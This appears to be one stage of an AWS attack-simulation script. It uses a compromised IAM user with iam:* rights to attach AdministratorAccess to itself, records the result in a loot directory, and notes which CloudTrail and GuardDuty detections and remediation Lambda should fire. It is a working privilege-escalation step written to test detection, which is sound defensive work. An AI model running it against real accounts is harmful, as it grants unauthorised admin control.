#!/usr/bin/env bash
# Stage 2 — Privilege Escalation (T1098.003 Additional Cloud Roles)
# The compromised user holds iam:* on Resource "*", so it can attach
# AdministratorAccess to itself. This is the classic IAM-privesc primitive and
# the exact action the detection layer (IAMPolicyChanges filter + GuardDuty)
# is built to catch.
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

phase "Stage 2 — Privilege Escalation"

whoami_arn="$(att sts get-caller-identity --query Arn --output text)"
user_name="${whoami_arn##*/}"
admin_arn="arn:aws:iam::aws:policy/AdministratorAccess"

step "Counting effective permissions before escalation"
before="$(att iam list-attached-user-policies --user-name "$user_name" \
  --query 'length(AttachedPolicies)' --output text)"
echo "Attached managed policies before: $before"

step "Attaching AdministratorAccess to self (iam:AttachUserPolicy)"
if att iam attach-user-policy --user-name "$user_name" --policy-arn "$admin_arn"; then
  ok "AdministratorAccess attached — user is now effectively account admin"
else
  warn "Attach failed (already attached, or permission changed)"
fi

step "Confirming escalation"
att iam list-attached-user-policies --user-name "$user_name" \
  --output json | tee "$LOOT_DIR/02-post-escalation-policies.json" >/dev/null

echo "MITRE: T1098.003 Additional Cloud Roles"
warn "This should fire: CloudTrail IAMPolicyChanges alarm + GuardDuty IAMUser finding"
warn "GuardDuty finding should trigger the disable_iam_keys remediation Lambda."
